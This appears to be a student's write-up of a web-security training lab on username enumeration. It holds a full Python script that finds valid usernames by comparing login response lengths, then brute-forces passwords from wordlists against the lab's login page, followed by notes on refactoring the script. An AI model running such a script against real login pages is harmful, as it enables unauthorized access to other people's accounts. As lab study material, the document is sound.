# Lab - 01 : Auth

Topic : Username enumeration via different responses

Auth : Different responses

End Goal : Finding  username and password

Analysis : 

1. Distinguish between the 2 responses.
    
    Wrong username → “Invalid username”
    
    Wrong password → “Incorrect password”
    
2. Brute force the login page using python script.
    - Script
        
        ```python
        #! /bin/python3
        
        import requests, sys
        
        URL = 'https://0a760013048ccd1480cbda0500fd0091.web-security-academy.net/login'
        
        # proxies = {"http":"127.0.0.1:8080", "https":"127.0.0.1:8080"} 
        
        print("[+] Bypassing auth ....")
        
        usernames = []
        with open("usernames.txt", 'r') as f_user:
        	usernames_extracted = f_user.readlines();
        	for username in usernames_extracted:
        		username = username.strip('\n')
        		usernames.append(username)
        
        	#usernames are stored in the list -> usernames
        
        passwords = []
        with open("passwords.txt", 'r') as f_pass:
        	passwords_extracted = f_pass.readlines();
        	for passwd in passwords_extracted:
        		passwd = passwd.strip('\n')
        		passwords.append(passwd)
        	#passwords are stored in the list -> passwords
        
        # print(len(passwords))
        
        print('- ' * 50)
        print(f"Scanning {len(usernames)} usernames ")
        print('- ' * 50)
        
        #send requests to the login page looping through all the users in the username 
        form_data = {
        	"username" : "demo_user",
        	"password" : "demo_pass"
        }
        
        r = requests.post(URL, data=form_data)
        normal_len = len(r.text)
        # print(f"Response Length: {len(r.text)}")
        # --------------------------------
        valid_users = []
        print("Checking usernames..... \n[", end ="")
        for name in usernames:
        	print('#', end="", flush=True)
        
        	form_data = {
        		"username" : name,
        		"password" : "test"
        	}
        	r = requests.post(URL, data=form_data)
        	if len(r.text) != normal_len:
        		valid_users.append(name)
        		# print(f"Username : {name}")
        		
        print("]")
        print(f"Found : {len(valid_users)}")
        print("Valid Usernames: ")
        for user in valid_users:
        	print(user)
        # -----------------------
        print('- ' * 50)
        print(f"Scanning {len(passwords)} passwords ")
        print('- ' * 50)
        print("Checking passwords..... \n[", end ="")
        for name in valid_users:
        	
        	for passwd in passwords:
        		print('#', end="", flush=True)
        		form_data = {
        			"username" : name,
        			"password" : passwd
        		}
        		r = requests.post(URL, data=form_data)
        		if 'Incorrect' not in r.text:
        			print("]")
        			print(f"Username : {name}")
        			print(f"Password : {passwd}")
        			break;
        
        # print(len(passwords))
        # print(usernames)
        ```
        
    - Script Improvements
        
        functions to integrate ->
        read_lines
        get_baseline (optional)
        findvalidusernames(usernames, baselen(optional))
        bruteforcepass(validusers,passwords)
        
        if **name** == "**main**": (write proper syntax)
        main()
        Use this, so that when importing this script, the main does not get actually called. But this
        ensures, it only runs when you directly call it.
        
    